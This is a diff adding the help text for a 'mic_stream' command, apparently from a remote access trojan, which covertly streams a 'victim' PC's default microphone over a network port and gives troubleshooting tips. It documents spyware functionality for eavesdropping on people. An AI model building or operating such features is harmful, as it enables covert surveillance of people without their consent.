@@ -1,0 +1,13 @@
+  Usage : Starts mic streaming of victim pc's default microphone
+
+Down below are differnt variants by which you can call this command	
+
+	1) mic_stream start
+		It will mic streaming at default port 8030
+	2) mic_stream start port
+		It will start mic streaming at specified port
+		Example : mic_stream start 8564
+
+  Note : Sometimes mic_stream may not start due to port is already bind with some other app. so you have to 
+	 1st write this command "mic_stream stop" to release mic from the app. now type this command again.
+	 If it still doesn't work then specify different port here while calling this command 
